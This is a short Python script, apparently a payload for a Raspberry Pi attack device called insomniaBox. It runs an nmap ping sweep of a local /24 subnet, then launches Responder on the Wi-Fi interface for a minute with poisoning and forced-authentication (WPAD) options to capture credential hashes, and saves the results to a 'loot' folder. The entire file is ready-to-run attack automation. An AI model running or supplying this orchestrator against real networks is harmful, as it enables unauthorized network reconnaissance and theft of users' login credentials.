#!/usr/bin/env python3
"""
insomniaBox Payload -- Auto Orchestrator
A master payload that systematically launches reconnaissance, sniffing, and Wi-Fi auditing.
"""

import time
import os
import subprocess
from datetime import datetime

LOOT_DIR = "/home/kali/Raspyjack/loot/insomnia"
LOG_FILE = os.path.join(LOOT_DIR, "insomnia_auto.log")

def log(msg):
    os.makedirs(LOOT_DIR, exist_ok=True)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    formatted_msg = f"[{timestamp}] {msg}\n"
    with open(LOG_FILE, "a") as f:
        f.write(formatted_msg)
    print(formatted_msg.strip())

def run_nmap_scan():
    log("[*] Starting Nmap Reconnaissance on local subnet...")
    try:
        # Get the IP of wlan0 or eth0 and scan its /24
        # Assuming eth0 for the HAT or wlan0 for wifi. Let's just do a quick ping sweep.
        # This is a simplified example that scans common local subnets.
        cmd = ["nmap", "-sn", "192.168.1.0/24", "-oN", os.path.join(LOOT_DIR, "nmap_sweep.txt")]
        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log("[+] Nmap scan complete. Saved to nmap_sweep.txt.")
    except Exception as e:
        log(f"[-] Nmap scan failed: {e}")

def run_responder():
    log("[*] Starting Responder in the background for 60 seconds...")
    try:
        # Launch responder via tmux or background process for a limited time
        cmd = ["sudo", "python3", "/home/kali/Raspyjack/Responder/Responder.py", "-I", "wlan0", "-w", "-F"]
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(60)
        proc.terminate()
        log("[+] Responder capture session finished.")
    except Exception as e:
        log(f"[-] Responder failed: {e}")

def main():
    log("=== insomniaBox Orchestrator Started ===")
    run_nmap_scan()
    run_responder()
    log("=== insomniaBox Orchestrator Finished ===")

if __name__ == "__main__":
    main()
